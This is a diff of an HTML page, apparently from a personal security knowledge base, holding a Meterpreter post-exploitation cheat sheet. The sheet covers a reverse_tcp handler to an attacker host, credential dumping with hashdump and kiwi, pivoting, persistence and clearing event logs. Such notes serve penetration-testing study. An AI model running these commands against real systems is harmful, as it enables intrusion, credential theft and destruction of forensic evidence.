@@ -3,11 +3,11 @@
 "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
 <head>
-<!-- 2026-07-20 Mon 15:56 -->
+<!-- 2026-07-30 Thu 22:15 -->
 <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Meterpreter</title>
-<meta name="author" content="termux" />
+<meta name="author" content="Gregory Hugaerts" />
 <meta name="generator" content="Org Mode" />
 <link rel="stylesheet" href="style.css" type="text/css"/>
 <style type='text/css'>
@@ -860,6 +860,24 @@ pre {
 </head>
 <body>
 <div id="preamble" class="status">
+<div id='generated-header' class='generated'><header>
+ <nav>
+<a class='nav-title'href='/index.html' >
+Gregory Hugaerts
+</a>
+<input id='nav-toggle-top' class='nav-toggle' type='checkbox'>
+<label class='nav-button' for='nav-toggle-top'><span/></label>
+<div class='separator menu-sep'></div>
+<ul class='nav-list'>
+<li class='nav-item'>
+<a class='nav-link' href='/index.html'>
+Knowledge Base</a>
+</li>
+</ul>
+<div class='separator'></div>
+</nav>
+</header>
+</div>
 <div id='view-controls'><div id='toggle-mode' title='Mode'>&#9788;</div><div id='goto-top' title='Top'>&#8963;</div><div id='toggle-toc' title='Contents'>&#9776;</div></div>
 </div>
 <div id="content" class="content">
@@ -868,22 +886,22 @@ pre {
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents" role="doc-toc">
 <ul>
-<li><a href="#org44d6b98">Opening a Session</a></li>
-<li><a href="#org7907d3e">Core Commands</a>
+<li><a href="#orgb3b1bf1">Opening a Session</a></li>
+<li><a href="#org14ba7d9">Core Commands</a>
 <ul>
-<li><a href="#org880708a">System Information</a></li>
-<li><a href="#orgf7549b9">Navigation and File System</a></li>
-<li><a href="#org16c9ff9">Process Migration</a></li>
-<li><a href="#org07a18e5">Privilege Escalation</a></li>
-<li><a href="#orgf6be6d3">Credentials</a></li>
-<li><a href="#org2a477cf">Network</a></li>
-<li><a href="#orge5f08db">Session Management</a></li>
-<li><a href="#org6b65d1d">Persistence</a></li>
-<li><a href="#orgd222b1c">Covering Tracks</a></li>
+<li><a href="#org8ed8852">System Information</a></li>
+<li><a href="#orgfac708a">Navigation and File System</a></li>
+<li><a href="#org0feb68f">Process Migration</a></li>
+<li><a href="#orge3b00a9">Privilege Escalation</a></li>
+<li><a href="#org3bd5ada">Credentials</a></li>
+<li><a href="#org7f1f161">Network</a></li>
+<li><a href="#orgfcc6ca8">Session Management</a></li>
+<li><a href="#org411a024">Persistence</a></li>
+<li><a href="#org8740a42">Covering Tracks</a></li>
 </ul>
 </li>
-<li><a href="#org4575175">Post-Exploitation Modules</a></li>
-<li><a href="#orgc443a02">Tips</a></li>
+<li><a href="#org5b21b17">Post-Exploitation Modules</a></li>
+<li><a href="#orga9e5679">Tips</a></li>
 </ul>
 </div>
 </div>
@@ -902,9 +920,9 @@ Related: <a href="20260213T110116--metasploit__cybersecurity_tool.html">Metasplo
          <a href="20260314T005758--windows-privilege-escalation__concept_cybersecurity.html">Windows Privilege Escalation</a>
          <a href="20260314T005740--pivoting__concept_cybersecurity.html">Pivoting</a>
 </p>
-<div id="outline-container-org44d6b98" class="outline-2">
-<h2 id="org44d6b98">Opening a Session</h2>
-<div class="outline-text-2" id="text-org44d6b98">
+<div id="outline-container-orgb3b1bf1" class="outline-2">
+<h2 id="orgb3b1bf1">Opening a Session</h2>
+<div class="outline-text-2" id="text-orgb3b1bf1">
 <p>
 Generate a Meterpreter payload with <a href="20260314T005736--msfvenom__cybersecurity_tool.html">Msfvenom</a>, set up a handler
 in <a href="20260213T110116--metasploit__cybersecurity_tool.html">Metasploit</a>, deliver the payload to the target. Once it
@@ -912,11 +930,11 @@ executes, a Meterpreter session opens.
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_48ecdefc3f844e7887a952256b1ddfd8>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_2b67730fa860450bba9c7c81a6819ad2>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_48ecdefc3f844e7887a952256b1ddfd8=document.querySelector('button[name=btn_48ecdefc3f844e7887a952256b1ddfd8]');
-copyBtnbtn_48ecdefc3f844e7887a952256b1ddfd8.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`msf6 > use exploit/multi/handler\nmsf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp\nmsf6 > set LHOST $ATTACKER\nmsf6 > set LPORT 4444\nmsf6 > run -j\n\n[*] Meterpreter session 1 opened\nmsf6 > sessions -i 1\nmeterpreter >\n`);copyBtnbtn_48ecdefc3f844e7887a952256b1ddfd8.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_48ecdefc3f844e7887a952256b1ddfd8.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_2b67730fa860450bba9c7c81a6819ad2=document.querySelector('button[name=btn_2b67730fa860450bba9c7c81a6819ad2]');
+copyBtnbtn_2b67730fa860450bba9c7c81a6819ad2.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`msf6 > use exploit/multi/handler\nmsf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp\nmsf6 > set LHOST $ATTACKER\nmsf6 > set LPORT 4444\nmsf6 > run -j\n\n[*] Meterpreter session 1 opened\nmsf6 > sessions -i 1\nmeterpreter >\n`);copyBtnbtn_2b67730fa860450bba9c7c81a6819ad2.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_2b67730fa860450bba9c7c81a6819ad2.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -933,19 +951,19 @@ meterpreter &gt;
 </div></div>
 </div>
 </div>
-<div id="outline-container-org7907d3e" class="outline-2">
-<h2 id="org7907d3e">Core Commands</h2>
-<div class="outline-text-2" id="text-org7907d3e">
+<div id="outline-container-org14ba7d9" class="outline-2">
+<h2 id="org14ba7d9">Core Commands</h2>
+<div class="outline-text-2" id="text-org14ba7d9">
 </div>
-<div id="outline-container-org880708a" class="outline-3">
-<h3 id="org880708a">System Information</h3>
-<div class="outline-text-3" id="text-org880708a">
+<div id="outline-container-org8ed8852" class="outline-3">
+<h3 id="org8ed8852">System Information</h3>
+<div class="outline-text-3" id="text-org8ed8852">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_f4caaf583dbb4b1598c44e91b563cc9f>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_ae77dc5bc8c84f3fb81b705f4c0598b1>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_f4caaf583dbb4b1598c44e91b563cc9f=document.querySelector('button[name=btn_f4caaf583dbb4b1598c44e91b563cc9f]');
-copyBtnbtn_f4caaf583dbb4b1598c44e91b563cc9f.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`sysinfo        # OS, hostname, architecture, domain\ngetuid         # current user context\ngetpid         # current process ID\nps             # list all running processes\n`);copyBtnbtn_f4caaf583dbb4b1598c44e91b563cc9f.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_f4caaf583dbb4b1598c44e91b563cc9f.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_ae77dc5bc8c84f3fb81b705f4c0598b1=document.querySelector('button[name=btn_ae77dc5bc8c84f3fb81b705f4c0598b1]');
+copyBtnbtn_ae77dc5bc8c84f3fb81b705f4c0598b1.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`sysinfo        # OS, hostname, architecture, domain\ngetuid         # current user context\ngetpid         # current process ID\nps             # list all running processes\n`);copyBtnbtn_ae77dc5bc8c84f3fb81b705f4c0598b1.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_ae77dc5bc8c84f3fb81b705f4c0598b1.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -957,15 +975,15 @@ let res = copyTextToClipboard(`sysinfo        # OS, hostname, architecture, doma
 </div></div>
 </div>
 </div>
-<div id="outline-container-orgf7549b9" class="outline-3">
-<h3 id="orgf7549b9">Navigation and File System</h3>
-<div class="outline-text-3" id="text-orgf7549b9">
+<div id="outline-container-orgfac708a" class="outline-3">
+<h3 id="orgfac708a">Navigation and File System</h3>
+<div class="outline-text-3" id="text-orgfac708a">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_6875153ad4b0411bbcb94fabeab2565a>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_0162d8a4478d49b184939c8fe88e7bb9>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_6875153ad4b0411bbcb94fabeab2565a=document.querySelector('button[name=btn_6875153ad4b0411bbcb94fabeab2565a]');
-copyBtnbtn_6875153ad4b0411bbcb94fabeab2565a.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`pwd            # current directory\nls             # list directory\ncd C:\\Users    # change directory\ncat file.txt   # read file\nedit file.txt  # open file editor\n\nupload /local/file.exe C:\\Temp\\file.exe\ndownload C:\\sensitive.txt /loot/sensitive.txt\n\nsearch -f *.config        # search for files by pattern\nsearch -f passwords.txt -d C:\\Users\n`);copyBtnbtn_6875153ad4b0411bbcb94fabeab2565a.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_6875153ad4b0411bbcb94fabeab2565a.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_0162d8a4478d49b184939c8fe88e7bb9=document.querySelector('button[name=btn_0162d8a4478d49b184939c8fe88e7bb9]');
+copyBtnbtn_0162d8a4478d49b184939c8fe88e7bb9.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`pwd            # current directory\nls             # list directory\ncd C:\\Users    # change directory\ncat file.txt   # read file\nedit file.txt  # open file editor\n\nupload /local/file.exe C:\\Temp\\file.exe\ndownload C:\\sensitive.txt /loot/sensitive.txt\n\nsearch -f *.config        # search for files by pattern\nsearch -f passwords.txt -d C:\\Users\n`);copyBtnbtn_0162d8a4478d49b184939c8fe88e7bb9.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_0162d8a4478d49b184939c8fe88e7bb9.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -984,9 +1002,9 @@ search -f *.config        <span style="color: var(--clr-comment-delimiter); back
 </div></div>
 </div>
 </div>
-<div id="outline-container-org16c9ff9" class="outline-3">
-<h3 id="org16c9ff9">Process Migration</h3>
-<div class="outline-text-3" id="text-org16c9ff9">
+<div id="outline-container-org0feb68f" class="outline-3">
+<h3 id="org0feb68f">Process Migration</h3>
+<div class="outline-text-3" id="text-org0feb68f">
 <p>
 Migrate into a more stable process to survive if the initial
 exploited process is killed. Also useful for inheriting
@@ -994,11 +1012,11 @@ another process's token (e.g. migrate to a SYSTEM process):
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_f6cd25e930c241d2888b9facd768bb8b>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_d2dd78bd752d48e69a7b876f7af5bbe6>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_f6cd25e930c241d2888b9facd768bb8b=document.querySelector('button[name=btn_f6cd25e930c241d2888b9facd768bb8b]');
-copyBtnbtn_f6cd25e930c241d2888b9facd768bb8b.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`ps                        # find a suitable target PID\nmigrate 1234              # migrate to PID 1234\nmigrate -N explorer.exe   # migrate by process name\n`);copyBtnbtn_f6cd25e930c241d2888b9facd768bb8b.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_f6cd25e930c241d2888b9facd768bb8b.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_d2dd78bd752d48e69a7b876f7af5bbe6=document.querySelector('button[name=btn_d2dd78bd752d48e69a7b876f7af5bbe6]');
+copyBtnbtn_d2dd78bd752d48e69a7b876f7af5bbe6.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`ps                        # find a suitable target PID\nmigrate 1234              # migrate to PID 1234\nmigrate -N explorer.exe   # migrate by process name\n`);copyBtnbtn_d2dd78bd752d48e69a7b876f7af5bbe6.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_d2dd78bd752d48e69a7b876f7af5bbe6.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1009,15 +1027,15 @@ let res = copyTextToClipboard(`ps                        # find a suitable targe
 </div></div>
 </div>
 </div>
-<div id="outline-container-org07a18e5" class="outline-3">
-<h3 id="org07a18e5">Privilege Escalation</h3>
-<div class="outline-text-3" id="text-org07a18e5">
+<div id="outline-container-orge3b00a9" class="outline-3">
+<h3 id="orge3b00a9">Privilege Escalation</h3>
+<div class="outline-text-3" id="text-orge3b00a9">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_a5f58db4d4584a83b453a196956a6831>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_2a67f0354c4d4404ae18b79aa391100c>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_a5f58db4d4584a83b453a196956a6831=document.querySelector('button[name=btn_a5f58db4d4584a83b453a196956a6831]');
-copyBtnbtn_a5f58db4d4584a83b453a196956a6831.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`getuid                    # confirm current privileges\ngetsystem                 # attempt automated local privesc\n                          # (named pipe impersonation etc.)\nuse post/multi/recon/local_exploit_suggester\nrun                       # suggest local privesc exploits\n`);copyBtnbtn_a5f58db4d4584a83b453a196956a6831.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_a5f58db4d4584a83b453a196956a6831.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_2a67f0354c4d4404ae18b79aa391100c=document.querySelector('button[name=btn_2a67f0354c4d4404ae18b79aa391100c]');
+copyBtnbtn_2a67f0354c4d4404ae18b79aa391100c.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`getuid                    # confirm current privileges\ngetsystem                 # attempt automated local privesc\n                          # (named pipe impersonation etc.)\nuse post/multi/recon/local_exploit_suggester\nrun                       # suggest local privesc exploits\n`);copyBtnbtn_2a67f0354c4d4404ae18b79aa391100c.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_2a67f0354c4d4404ae18b79aa391100c.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1030,15 +1048,15 @@ run                       <span style="color: var(--clr-comment-delimiter); back
 </div></div>
 </div>
 </div>
-<div id="outline-container-orgf6be6d3" class="outline-3">
-<h3 id="orgf6be6d3">Credentials</h3>
-<div class="outline-text-3" id="text-orgf6be6d3">
+<div id="outline-container-org3bd5ada" class="outline-3">
+<h3 id="org3bd5ada">Credentials</h3>
+<div class="outline-text-3" id="text-org3bd5ada">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_62eb2fc9afd64f09bb74e762961bf66c>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_424ed523461a40e38217ace709b2ba75>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_62eb2fc9afd64f09bb74e762961bf66c=document.querySelector('button[name=btn_62eb2fc9afd64f09bb74e762961bf66c]');
-copyBtnbtn_62eb2fc9afd64f09bb74e762961bf66c.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`hashdump                  # dump local SAM hashes (requires SYSTEM)\nload kiwi                 # load Mimikatz extension (v4+ replaces mimikatz)\ncreds_all                 # dump all credentials (kiwi)\nlsa_dump_sam              # dump SAM via LSA (kiwi)\nlsa_dump_secrets          # dump LSA secrets (kiwi)\n`);copyBtnbtn_62eb2fc9afd64f09bb74e762961bf66c.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_62eb2fc9afd64f09bb74e762961bf66c.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_424ed523461a40e38217ace709b2ba75=document.querySelector('button[name=btn_424ed523461a40e38217ace709b2ba75]');
+copyBtnbtn_424ed523461a40e38217ace709b2ba75.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`hashdump                  # dump local SAM hashes (requires SYSTEM)\nload kiwi                 # load Mimikatz extension (v4+ replaces mimikatz)\ncreds_all                 # dump all credentials (kiwi)\nlsa_dump_sam              # dump SAM via LSA (kiwi)\nlsa_dump_secrets          # dump LSA secrets (kiwi)\n`);copyBtnbtn_424ed523461a40e38217ace709b2ba75.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_424ed523461a40e38217ace709b2ba75.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1051,15 +1069,15 @@ let res = copyTextToClipboard(`hashdump                  # dump local SAM hashes
 </div></div>
 </div>
 </div>
-<div id="outline-container-org2a477cf" class="outline-3">
-<h3 id="org2a477cf">Network</h3>
-<div class="outline-text-3" id="text-org2a477cf">
+<div id="outline-container-org7f1f161" class="outline-3">
+<h3 id="org7f1f161">Network</h3>
+<div class="outline-text-3" id="text-org7f1f161">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_df437e176ebb4d0daf32001ac9624814>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_8a6c3b6c79b248d38e51ed6580245df4>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_df437e176ebb4d0daf32001ac9624814=document.querySelector('button[name=btn_df437e176ebb4d0daf32001ac9624814]');
-copyBtnbtn_df437e176ebb4d0daf32001ac9624814.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`ipconfig                  # network interfaces\narp                       # ARP table\nnetstat                   # active connections\nportfwd add -l 3389 -p 3389 -r 192.168.1.10   # port forward\nroute add 192.168.2.0/24 1                      # add pivot route via session 1\n`);copyBtnbtn_df437e176ebb4d0daf32001ac9624814.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_df437e176ebb4d0daf32001ac9624814.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_8a6c3b6c79b248d38e51ed6580245df4=document.querySelector('button[name=btn_8a6c3b6c79b248d38e51ed6580245df4]');
+copyBtnbtn_8a6c3b6c79b248d38e51ed6580245df4.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`ipconfig                  # network interfaces\narp                       # ARP table\nnetstat                   # active connections\nportfwd add -l 3389 -p 3389 -r 192.168.1.10   # port forward\nroute add 192.168.2.0/24 1                      # add pivot route via session 1\n`);copyBtnbtn_8a6c3b6c79b248d38e51ed6580245df4.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_8a6c3b6c79b248d38e51ed6580245df4.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1072,15 +1090,15 @@ let res = copyTextToClipboard(`ipconfig                  # network interfaces\na
 </div></div>
 </div>
 </div>
-<div id="outline-container-orge5f08db" class="outline-3">
-<h3 id="orge5f08db">Session Management</h3>
-<div class="outline-text-3" id="text-orge5f08db">
+<div id="outline-container-orgfcc6ca8" class="outline-3">
+<h3 id="orgfcc6ca8">Session Management</h3>
+<div class="outline-text-3" id="text-orgfcc6ca8">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_8637526c6e0743b381bd971d90a851e5>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_e89e155af72f4cbf977369706260167b>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_8637526c6e0743b381bd971d90a851e5=document.querySelector('button[name=btn_8637526c6e0743b381bd971d90a851e5]');
-copyBtnbtn_8637526c6e0743b381bd971d90a851e5.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`background      # background session, return to msfconsole (Ctrl+Z)\nsessions -l     # list sessions\nsessions -i 1   # re-enter session\n`);copyBtnbtn_8637526c6e0743b381bd971d90a851e5.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_8637526c6e0743b381bd971d90a851e5.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_e89e155af72f4cbf977369706260167b=document.querySelector('button[name=btn_e89e155af72f4cbf977369706260167b]');
+copyBtnbtn_e89e155af72f4cbf977369706260167b.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`background      # background session, return to msfconsole (Ctrl+Z)\nsessions -l     # list sessions\nsessions -i 1   # re-enter session\n`);copyBtnbtn_e89e155af72f4cbf977369706260167b.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_e89e155af72f4cbf977369706260167b.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1091,15 +1109,15 @@ let res = copyTextToClipboard(`background      # background session, return to m
 </div></div>
 </div>
 </div>
-<div id="outline-container-org6b65d1d" class="outline-3">
-<h3 id="org6b65d1d">Persistence</h3>
-<div class="outline-text-3" id="text-org6b65d1d">
+<div id="outline-container-org411a024" class="outline-3">
+<h3 id="org411a024">Persistence</h3>
+<div class="outline-text-3" id="text-org411a024">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_8cd9f89ef7b945a4931ec0b41079b913>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_ac7a7cf094624884bb26c0a1c8bbecaf>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_8cd9f89ef7b945a4931ec0b41079b913=document.querySelector('button[name=btn_8cd9f89ef7b945a4931ec0b41079b913]');
-copyBtnbtn_8cd9f89ef7b945a4931ec0b41079b913.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`run post/windows/manage/persistence_exe STARTUP=SCHEDULER\nrun post/linux/manage/cron_persistence\n`);copyBtnbtn_8cd9f89ef7b945a4931ec0b41079b913.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_8cd9f89ef7b945a4931ec0b41079b913.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_ac7a7cf094624884bb26c0a1c8bbecaf=document.querySelector('button[name=btn_ac7a7cf094624884bb26c0a1c8bbecaf]');
+copyBtnbtn_ac7a7cf094624884bb26c0a1c8bbecaf.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`run post/windows/manage/persistence_exe STARTUP=SCHEDULER\nrun post/linux/manage/cron_persistence\n`);copyBtnbtn_ac7a7cf094624884bb26c0a1c8bbecaf.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_ac7a7cf094624884bb26c0a1c8bbecaf.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1109,15 +1127,15 @@ run post/linux/manage/cron_persistence
 </div></div>
 </div>
 </div>
-<div id="outline-container-orgd222b1c" class="outline-3">
-<h3 id="orgd222b1c">Covering Tracks</h3>
-<div class="outline-text-3" id="text-orgd222b1c">
+<div id="outline-container-org8740a42" class="outline-3">
+<h3 id="org8740a42">Covering Tracks</h3>
+<div class="outline-text-3" id="text-org8740a42">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_2a1977068c504be4b8b8f3755362908a>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_2c8e073a6e584bb7a89b93b7763c383e>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_2a1977068c504be4b8b8f3755362908a=document.querySelector('button[name=btn_2a1977068c504be4b8b8f3755362908a]');
-copyBtnbtn_2a1977068c504be4b8b8f3755362908a.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`clearev         # clear Windows event logs (Security, System, Application)\ntimestomp C:\\evil.exe -m \"01/01/2020 12:00:00\"   # modify file timestamps\n`);copyBtnbtn_2a1977068c504be4b8b8f3755362908a.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_2a1977068c504be4b8b8f3755362908a.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_2c8e073a6e584bb7a89b93b7763c383e=document.querySelector('button[name=btn_2c8e073a6e584bb7a89b93b7763c383e]');
+copyBtnbtn_2c8e073a6e584bb7a89b93b7763c383e.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`clearev         # clear Windows event logs (Security, System, Application)\ntimestomp C:\\evil.exe -m \"01/01/2020 12:00:00\"   # modify file timestamps\n`);copyBtnbtn_2c8e073a6e584bb7a89b93b7763c383e.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_2c8e073a6e584bb7a89b93b7763c383e.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1128,19 +1146,19 @@ let res = copyTextToClipboard(`clearev         # clear Windows event logs (Secur
 </div>
 </div>
 </div>
-<div id="outline-container-org4575175" class="outline-2">
-<h2 id="org4575175">Post-Exploitation Modules</h2>
-<div class="outline-text-2" id="text-org4575175">
+<div id="outline-container-org5b21b17" class="outline-2">
+<h2 id="org5b21b17">Post-Exploitation Modules</h2>
+<div class="outline-text-2" id="text-org5b21b17">
 <p>
 Once in a Meterpreter session, run post modules directly:
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_bbe8095eb7cb46e7826ceb2eb0b206e8>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_93c304add3d9418a94670ec124cf59bd>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_bbe8095eb7cb46e7826ceb2eb0b206e8=document.querySelector('button[name=btn_bbe8095eb7cb46e7826ceb2eb0b206e8]');
-copyBtnbtn_bbe8095eb7cb46e7826ceb2eb0b206e8.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`run post/windows/gather/hashdump\nrun post/multi/gather/env\nrun post/windows/gather/enum_shares\nrun post/windows/gather/credentials/credential_collector\nrun post/multi/recon/local_exploit_suggester\n\n# Or background the session and use modules from msfconsole\nbackground\nuse post/windows/gather/hashdump\nset SESSION 1\nrun\n`);copyBtnbtn_bbe8095eb7cb46e7826ceb2eb0b206e8.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_bbe8095eb7cb46e7826ceb2eb0b206e8.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_93c304add3d9418a94670ec124cf59bd=document.querySelector('button[name=btn_93c304add3d9418a94670ec124cf59bd]');
+copyBtnbtn_93c304add3d9418a94670ec124cf59bd.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`run post/windows/gather/hashdump\nrun post/multi/gather/env\nrun post/windows/gather/enum_shares\nrun post/windows/gather/credentials/credential_collector\nrun post/multi/recon/local_exploit_suggester\n\n# Or background the session and use modules from msfconsole\nbackground\nuse post/windows/gather/hashdump\nset SESSION 1\nrun\n`);copyBtnbtn_93c304add3d9418a94670ec124cf59bd.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_93c304add3d9418a94670ec124cf59bd.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1159,9 +1177,9 @@ run
 </div></div>
 </div>
 </div>
-<div id="outline-container-orgc443a02" class="outline-2">
-<h2 id="orgc443a02">Tips</h2>
-<div class="outline-text-2" id="text-orgc443a02">
+<div id="outline-container-orga9e5679" class="outline-2">
+<h2 id="orga9e5679">Tips</h2>
+<div class="outline-text-2" id="text-orga9e5679">
 <ul class="org-ul">
 <li>Migrate immediately after getting a session — the initial
 exploited process is often unstable; <code>explorer.exe</code> or
@@ -1182,6 +1200,20 @@ Ligolo-ng as alternatives</li>
 </div>
 </div>
 <div id="postamble" class="status">
+<div id='generated-footer' class='generated'><footer>
+ <nav>
+<div class='separator'></div>
+<a class='nav-author'href='https://gregoryhugaerts.github.io' >
+gregoryhugaerts.github.io
+</a>
+<input id='nav-toggle-bot' class='nav-toggle' type='checkbox'>
+<label class='nav-button' for='nav-toggle-bot'><span/></label>
+<div class='separator menu-sep'></div>
+<ul class='nav-list'>
+</ul>
+</nav>
+</footer>
+</div>
 <script type="text/javascript">
 <!--/*--><![CDATA[/*><!--*/
 if (!document.cookie.split('; ').find(r => r.startsWith('mode'))) {
@@ -1189,6 +1221,7 @@ document.cookie = 'mode=dark'
 }
 document.cookie = 'light=modus-operandi-tinted'
 document.cookie = 'dark=modus-vivendi-tinted'
+document.cookie = 'options=collapsing:t__src-lang:t';
 /*
 ;; nice-org-html.js
 ;;==============================================================================
